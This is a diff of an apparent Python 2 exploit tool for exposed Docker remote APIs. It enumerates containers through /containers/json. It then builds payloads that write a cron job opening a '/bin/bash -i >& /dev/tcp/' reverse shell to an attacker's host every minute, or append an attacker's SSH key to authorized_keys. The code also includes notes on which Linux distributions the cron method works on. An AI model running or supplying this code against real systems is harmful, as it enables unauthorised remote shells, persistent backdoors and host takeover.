@@ -35,16 +35,16 @@ def isset(v):
 def printport(portsList, name):
     if isset("portsList['IP']") == 0:
         portsList['IP']="*"
-        printport(portsList)
+        printport(portsList,name)
     elif isset("portsList['Type']") == 0:
         portsList['Type']="*"
-        printport(portsList)
+        printport(portsList,name)
     elif isset("portsList['PublicPort']") == 0:
         portsList['PublicPort']="*"
-        printport(portsList)
+        printport(portsList,name)
     elif isset("portsList['PrivatePort']") == 0:
         portsList['PrivatePort']="*"
-        printport(portsList)
+        printport(portsList,name)
     else:
         print "[-]"+name+"[+]"+portsList['Type']+"[-]"+portsList['IP']+":"+str(portsList['PrivatePort'])+" --> "+host+":"+str(portsList['PublicPort'])
 
@@ -118,7 +118,8 @@ if __name__ == "__main__":
             key = 1
             
     if isset('lhsot') and isset('lport'):
-        payload = '/bin/bash -c "echo \\\"*/1 * * * * /bin/bash -i >& /dev/tcp/'+lhsot+'/'+lport+' 0>&1\\\" > /tmp/spool/cron/root1"'
+        #payload = '/bin/bash -c "echo \\\"*/1 * * * * root /bin/bash -i >& /dev/tcp/'+lhsot+'/'+lport+' 0>&1\\\" >> /tmp/spool/cron/crontabs/root"' #ubuntu failure,beacuse It need to restart the cron or system
+        payload = '/bin/bash -c "echo \\\"*/1 * * * * /bin/bash -i >& /dev/tcp/'+lhsot+'/'+lport+' 0>&1\\\" >> /tmp/spool/cron/root"'  #centos,redhat and so on
         print "[-]Paylaod: "+payload
     if sshkey !='' and key == 1:
         payload = '/bin/bash -c "echo \\\"'+sshkey+'\\\" >> /tmp1/.ssh/authorized_keys"'
@@ -156,7 +157,10 @@ if __name__ == "__main__":
             url = "http://"+host+":"+port+"/containers/json"
             ret = json.loads(http_get(url))
             for pl in ret:
-                name = pl['Names'][0]
+                if isset("pl['Names'][0]"):
+                    name = pl['Names'][0]
+                else:
+                    name = '*'
                 for portsList in pl['Ports']:
                     printport(portsList, name)
         else:
